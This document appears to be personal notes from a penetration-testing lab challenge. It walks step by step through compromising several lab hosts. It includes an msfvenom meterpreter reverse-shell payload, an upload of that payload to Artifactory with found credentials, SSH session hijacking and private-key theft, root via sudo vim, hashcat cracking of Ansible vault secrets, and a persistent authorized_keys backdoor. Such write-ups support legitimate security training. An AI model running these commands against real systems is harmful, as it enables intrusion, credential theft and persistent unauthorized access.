# Penetration Test Enumeration & Exploitation Guide

## Enumeration

**Directory Enumeration**

- Identified `upload.html` during directory enumeration.

## Payload Generation

**Generate Payload with msfvenom:**

```bash
msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=tun0 LPORT=443 EXITFUNC=thread -f elf --encrypt xor --encrypt-key 'CHANGEMYKEY' prependfork=true -t 300 -o test.elf
```

## File Enumeration

**User Files:**

```bash
Mode              Size  Type  Last modified              Name
----              ----  ----  -------------              ----
100644/rw-r--r--  18    fil   2019-11-08 11:21:40 -0500  .bash_logout
100644/rw-r--r--  141   fil   2019-11-08 11:21:40 -0500  .bash_profile
100644/rw-r--r--  312   fil   2019-11-08 11:21:40 -0500  .bashrc
100644/rw-r--r--  33    fil   2025-03-12 17:44:12 -0400  local.txt
100644/rw-r--r--  23    fil   2020-08-20 11:34:43 -0400  repo.txt
```

- Contents of `repo.txt`:

```bash
walleyedev
photofinish
```

## Exploiting Artifactory

- Navigate to `192.168.151.173`.
- Log in with credentials:
    - Username: `walleyedev`
    - Password: `photofinish`

![[Pasted image 20250312163001.png]]

**File Upload via JFrog Artifactory:**

```bash
curl -u walleyedev:photofinish -T /home/kali/osep/challenge_3/test3.elf "http://192.168.151.173:8081/artifactory/generic-local/test3.elf"
```

![[Pasted image 20250312163027.png]]

- Start Meterpreter shell with option `fix checksums` to gain shell as user `nottodd` on `192.168.151.172`.

![[Pasted image 20250312164605.png]]

## SSH Access via Hijacking

- Monitor `.ssh/controlmaster` directory:

```bash
watch -n 1 ls -la
```

- Quickly connect using intercepted SSH session:

```bash
ssh marks@cb3
```

- Confirm access and retrieve private key (`id_rsa`): use head/cat to get the full key

```bash
head -n 20 id_rsa
```

```bash
cat is_rsa
```
## Privilege Escalation

- Identify authorized SSH keys:

```bash
meterpreter > cat authorized_keys
```

- Confirm key association (Mark → nottodd).

**SSH access to Todd:**

```bash
ssh -i id_rsa todd@192.168.193.172
```

## Privilege Escalation on `cb2`

- Verify sudo privileges for Todd:

```bash
sudo -l
(root) NOPASSWD: /usr/bin/vim /opt/tpsreports.txt
```

- Exploit Vim to escalate privileges:

```bash
sudo /usr/bin/vim /opt/tpsreports.txt
```

- Within Vim, escalate to root shell:

```vim
:!/bin/sh
# whoami
root
```

## Ansible Vault Decryption

- Enumerate Ansible configuration and decrypt credentials:

```bash
cat webserver.yaml
ansible2john test1.txt > cred1.hash
```

- Crack hash using Hashcat:

```bash
hashcat -m 16900 -O -a 0 -w 4 cred_fixed.hash /usr/share/wordlists/rockyou.txt
```

- Password discovered:

```
bowwow
```

- Decrypt Ansible vault:

```bash
ansible-vault decrypt
Password: lifeintheantfarm
```

## Escalation to Root on `.171`

- SSH into `ansibleadm`:

```bash
ssh -i id_rsa ansibleadm@192.168.193.171
```

- Switch to root:

```bash
su root
Password: bowwow
```

## Final Enumeration & Privilege Maintenance

- Use `pspy` for process monitoring on `173`:

```bash
./pspy
```

- Transfer and execute tools (e.g., `pspy`):

```bash
wget --user todd --password whyaretheresomanyants http://cb3:8082/artifactory/generic-local/pspy >> /home/marks/pspy
```

## SSH Key Generation for Persistent Access

- Generate SSH keys and append the public key to authorized keys:

```bash
ssh-keygen -t rsa -b 4096 -C "173"
echo "<PUBLIC_KEY>" >> ~/.ssh/authorized_keys
```

- Test new SSH connection:

```bash
ssh -i id_rsa1 marks@192.168.193.173
```

## Privilege Escalation via Scheduled Task

- Identify privileged commands:

```bash
2025/03/13 17:10:02 CMD: UID=1002 PID=20132 | bash -i -c source /home/marks/.bashrc; echo "nothingwaschangedargh" | sudo -S netstat -ap > /tmp/mark_listening.txt
```

- Execute command to escalate privileges:

```bash
sudo -S su root
Password: nothingwaschangedargh
```

---

### Final Steps

Root privileges were obtained successfully across multiple hosts through enumeration, exploitation, SSH key manipulation, and leveraging insecure configurations.